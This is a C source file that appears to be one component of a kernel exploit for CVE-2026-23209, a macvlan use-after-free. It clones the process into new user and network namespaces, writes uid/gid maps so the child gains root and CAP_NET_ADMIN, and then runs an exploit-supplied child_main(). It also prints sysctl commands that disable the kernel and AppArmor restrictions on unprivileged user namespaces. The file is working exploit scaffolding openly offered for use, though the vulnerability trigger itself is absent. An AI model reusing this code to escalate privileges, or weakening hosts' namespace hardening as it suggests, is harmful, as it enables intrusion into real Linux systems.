#define _GNU_SOURCE
#include "userns.h"
#include <sys/stat.h>
#include <errno.h>

/*
 * Create a child process in new user+network namespaces.
 *
 * The kernel allows clone(CLONE_NEWUSER|CLONE_NEWNET) in a single call,
 * but does NOT allow unshare(CLONE_NEWNET) from within an existing
 * user namespace (the transitive capability check reaches init_user_ns).
 *
 * Pattern:
 *   parent: clone(NEWUSER|NEWNET) -> child
 *   parent: write uid_map, gid_map for child
 *   parent: signal child
 *   child:  runs with uid=0 in new user+net namespace
 *   child:  calls child_main() which the exploit provides
 *   parent: waitpid()
 *
 * IMPORTANT: CVE-2026-23209 (macvlan UAF) requires CAP_NET_ADMIN which
 * can only be obtained via user namespaces for non-root users.
 * On restrictive kernels, you may need:
 *   sudo sysctl -w kernel.unprivileged_userns_clone=1
 *   sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=0
 */

typedef int (*userns_child_fn_t)(void *arg);

struct userns_setup {
    userns_child_fn_t fn;
    void *arg;
    int ready_pipe[2];   /* parent signals child when maps are ready */
};

/*
 * userns_check_available - Probe whether user+net namespaces can be created.
 *
 * Performs a probe clone() with CLONE_NEWUSER|CLONE_NEWNET to test if the
 * kernel allows unprivileged user namespace creation. Does not execute any
 * user code in the child.
 *
 * Returns: 0 if namespaces are available, -1 otherwise.
 * On failure, prints diagnostic information to stderr.
 */
static int pause_wrapper(void *arg) {
    (void)arg;
    pause();
    return 0;
}

int userns_check_available(void) {
    static char test_stack[4096];

    printf("[*] Probing user namespace availability...\n");

    int pipefd[2];
    if (pipe(pipefd) < 0) {
        perror("[-] probe: pipe");
        return -1;
    }

    pid_t probe = clone(
        pause_wrapper,
        test_stack + sizeof(test_stack),
        CLONE_NEWUSER | CLONE_NEWNET | SIGCHLD,
        NULL);

    if (probe < 0) {
        close(pipefd[0]);
        close(pipefd[1]);

        if (errno == EPERM) {
            fprintf(stderr,
                "[-] User namespace creation denied (EPERM).\n"
                "[-] This typically means one of:\n"
                "[-]   - kernel.unprivileged_userns_clone = 0\n"
                "[-]   - kernel.apparmor_restrict_unprivileged_userns = 1\n"
                "[-]   - AppArmor policy blocking user namespaces\n"
                "[-]\n"
                "[-] To enable, run as root:\n"
                "[-]   sysctl -w kernel.unprivileged_userns_clone=1\n"
                "[-]   sysctl -w kernel.apparmor_restrict_unprivileged_userns=0\n");
        } else if (errno == EINVAL) {
            fprintf(stderr,
                "[-] Invalid clone flags (EINVAL).\n"
                "[-] User namespaces may not be compiled into this kernel.\n");
        } else {
            fprintf(stderr, "[-] clone(NEWUSER|NEWNET) failed: %d (%s)\n",
                    errno, strerror(errno));
        }
        return -1;
    }

    printf("[+] User namespace creation succeeded (pid=%d)\n", probe);

    kill(probe, SIGKILL);
    waitpid(probe, NULL, 0);
    close(pipefd[0]);
    close(pipefd[1]);

    return 0;
}

static int userns_child(void *setup_arg) {
    struct userns_setup *s = (struct userns_setup *)setup_arg;
    char c;

    close(s->ready_pipe[1]);

    /* Disable output buffering - child inherits parent's fd */
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    /* Wait for parent to set up uid/gid maps */
    if (read(s->ready_pipe[0], &c, 1) < 0) {
        fprintf(stderr, "[-] child: read from ready pipe failed\n");
        _exit(1);
    }
    close(s->ready_pipe[0]);

    /* After parent wrote uid_map, we are uid 0 in the new namespace */
    if (geteuid() != 0) {
        fprintf(stderr, "[-] child: expected euid 0, got %d\n", geteuid());
        _exit(1);
    }

    printf("[+] userns: uid=%d euid=%d (CAP_NET_ADMIN available)\n",
           getuid(), geteuid());

    int ret = s->fn(s->arg);
    fflush(stdout);
    fflush(stderr);
    _exit(ret);
}

int userns_clone_and_run(userns_child_fn_t fn, void *arg) {
    struct userns_setup setup = {
        .fn = fn,
        .arg = arg,
    };

    if (pipe(setup.ready_pipe) < 0) {
        perror("[-] pipe");
        return -1;
    }

    static char child_stack[1048576]; /* 1MB stack */

    pid_t child = clone(userns_child, child_stack + sizeof(child_stack),
                        CLONE_NEWUSER | CLONE_NEWNET | SIGCHLD,
                        &setup);
    if (child < 0) {
        perror("[-] clone(NEWUSER|NEWNET)");
        close(setup.ready_pipe[0]);
        close(setup.ready_pipe[1]);
        return -1;
    }

    /* Parent: write uid/gid maps for the child */
    uid_t uid = getuid();
    gid_t gid = getgid();
    char path[128], buf[64];
    int fd;

    snprintf(path, sizeof(path), "/proc/%d/uid_map", child);
    fd = open(path, O_WRONLY);
    if (fd < 0) {
        perror("[-] open uid_map");
        goto fail;
    }
    snprintf(buf, sizeof(buf), "0 %d 1\n", uid);
    if (write(fd, buf, strlen(buf)) < 0) {
        perror("[-] write uid_map");
        close(fd);
        goto fail;
    }
    close(fd);

    snprintf(path, sizeof(path), "/proc/%d/setgroups", child);
    fd = open(path, O_WRONLY);
    if (fd >= 0) {
        write(fd, "deny\n", 5);
        close(fd);
    }

    snprintf(path, sizeof(path), "/proc/%d/gid_map", child);
    fd = open(path, O_WRONLY);
    if (fd < 0) {
        perror("[-] open gid_map");
        goto fail;
    }
    snprintf(buf, sizeof(buf), "0 %d 1\n", gid);
    if (write(fd, buf, strlen(buf)) < 0) {
        perror("[-] write gid_map");
        close(fd);
        goto fail;
    }
    close(fd);

    /* Signal child that maps are ready */
    write(setup.ready_pipe[1], "x", 1);
    close(setup.ready_pipe[1]);
    close(setup.ready_pipe[0]);

    /* Wait for child to complete */
    int status;
    waitpid(child, &status, 0);

    return WIFEXITED(status) ? WEXITSTATUS(status) : -1;

fail:
    close(setup.ready_pipe[0]);
    close(setup.ready_pipe[1]);
    kill(child, SIGKILL);
    waitpid(child, NULL, 0);
    return -1;
}
